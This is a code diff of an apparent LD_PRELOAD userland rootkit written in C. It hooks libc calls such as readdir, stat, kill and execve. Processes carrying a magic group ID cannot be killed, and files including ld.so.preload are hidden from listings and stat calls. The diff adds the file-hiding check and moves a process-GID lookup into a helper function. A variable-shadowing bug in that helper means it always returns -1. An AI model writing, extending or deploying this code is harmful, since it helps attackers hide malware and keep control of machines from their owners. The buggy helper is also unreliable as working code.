@@ -11,6 +11,32 @@
 #include <fcntl.h>
 #include <pcap.h>
 
+// for internal use
+
+struct dirent *(*__o_readdir)(DIR *);
+struct dirent *__readdir(DIR *p) {
+#ifdef VERBOSE
+    printf("readdir called\n");
+#endif
+    if(!__o_readdir)
+        __o_readdir = dlsym(RTLD_NEXT, "readdir");
+
+    return __o_readdir(p);
+}
+
+// for internal use
+
+DIR *(*__o_opendir)(const char *);
+DIR *__opendir(const char *name) {
+#ifdef VERBOSE
+    printf("opendir called\n");
+#endif
+    if(!__o_opendir)
+        __o_opendir = dlsym(RTLD_NEXT, "opendir");
+
+    return __o_opendir(name);
+}
+
 int good_gid() {
     gid_t gid = getgid();
     if (gid == GID) {
@@ -20,6 +46,31 @@ int good_gid() {
 }
 
 // EXECVE
+
+int pid_to_gid(int pid) {
+    char path[1024];
+    sprintf(path, "/proc/%d/status", pid);
+    FILE *fp = fopen(path, "r");
+    if (fp == NULL) {
+        return -1;
+    }
+
+    int gid = -1;
+    char line[256];
+    while (fgets(line, sizeof(line), fp)) {
+        if (strncmp(line, "Gid:", 4) == 0) {
+            int gid;
+            if (sscanf(line, "Gid: %d", &gid) == 1) {
+                break;
+            }
+            break;
+        }
+    }
+
+    fclose(fp);
+
+    return gid;
+}
 
 int (*o_execve)(const char *, char *const argv[], char *const envp[]);
 int execve(const char *path, char *const argv[], char *const envp[]) {
@@ -64,7 +115,7 @@ struct dirent *readdir(DIR *p) {
         // hide file
         return readdir(p);
     }
-    
+
     return dir;
 }
 
@@ -184,8 +235,6 @@ ssize_t read(int fd, void *xbuf, size_t count) {
     return o_read(fd, xbuf, count);
 }
 
-// kill
-
 int (*o_kill)(pid_t, int);
 int kill(pid_t pid, int sig) {
 #ifdef VERBOSE
@@ -198,27 +247,7 @@ int kill(pid_t pid, int sig) {
         return o_kill(pid, sig);
     }
 
-    // check the proccess gid
-    char path[1024];
-    sprintf(path, "/proc/%d/status", pid);
-    FILE *fp = fopen(path, "r");
-    if (fp == NULL) {
-        return o_kill(pid, sig);
-    }
-
-    int gid = -1;
-    char line[256];
-    while (fgets(line, sizeof(line), fp)) {
-        if (strncmp(line, "Gid:", 4) == 0) {
-            int gid;
-            if (sscanf(line, "Gid: %d", &gid) == 1) {
-                break;
-            }
-            break;
-        }
-    }
-
-    fclose(fp);
+    int gid = pid_to_gid(pid);
 
     if (gid == GID) {
         return -1;
@@ -312,23 +341,6 @@ FILE *fopen(const char *path, const char *mode) {
     return o_fopen(path, mode);
 }
 
-//shutdown
-
-int (*o_shutdown)(int, int);
-int shutdown(int sockfd, int how) {
-#ifdef VERBOSE
-    printf("shutdown called\n");
-#endif
-    if(!o_shutdown)
-        o_shutdown = dlsym(RTLD_NEXT, "shutdown");
-
-    if (good_gid() == 1) {
-        return o_shutdown(sockfd, how);
-    }
-
-    return o_shutdown(sockfd, how);
-}
-
 // opendir
 
 DIR *(*o_opendir)(const char *);
@@ -360,58 +372,11 @@ int stat(const char *pathname, struct stat *statbuf) {
         return o_stat(pathname, statbuf);
     }
 
+    if (strcmp(pathname, "ld.so.preload") == 0 || strcmp(pathname, HIDDEN_FILENAME) == 0 || strcmp(pathname, HIDDEN_FILENAME2) == 0) {
+        return -1;
+    }
+
     return o_stat(pathname, statbuf);
-}
-
-// statfs
-
-int (*o_statfs)(const char *, struct statfs *);
-int statfs(const char *pathname, struct statfs *buf) {
-#ifdef VERBOSE
-    printf("statfs called\n");
-#endif
-    if(!o_statfs)
-        o_statfs = dlsym(RTLD_NEXT, "statfs");
-
-    if (good_gid() == 1) {
-        return o_statfs(pathname, buf);
-    }
-
-    return o_statfs(pathname, buf);
-}
-
-// xstat
-
-int (*o_xstat)(int, const char *, struct stat *);
-int __xstat(int ver, const char *pathname, struct stat *statbuf) {
-#ifdef VERBOSE
-    printf("xstat called\n");
-#endif
-    if(!o_xstat)
-        o_xstat = dlsym(RTLD_NEXT, "__xstat");
-
-    if (good_gid() == 1) {
-        return o_xstat(ver, pathname, statbuf);
-    }
-
-    return o_xstat(ver, pathname, statbuf);
-}
-
-// lstat
-
-int (*o_lstat)(const char *, struct stat *);
-int lstat(const char *pathname, struct stat *statbuf) {
-#ifdef VERBOSE
-    printf("lstat called\n");
-#endif
-    if(!o_lstat)
-        o_lstat = dlsym(RTLD_NEXT, "lstat");
-
-    if (good_gid() == 1) {
-        return o_lstat(pathname, statbuf);
-    }
-
-    return o_lstat(pathname, statbuf);
 }
 
 // ioctl
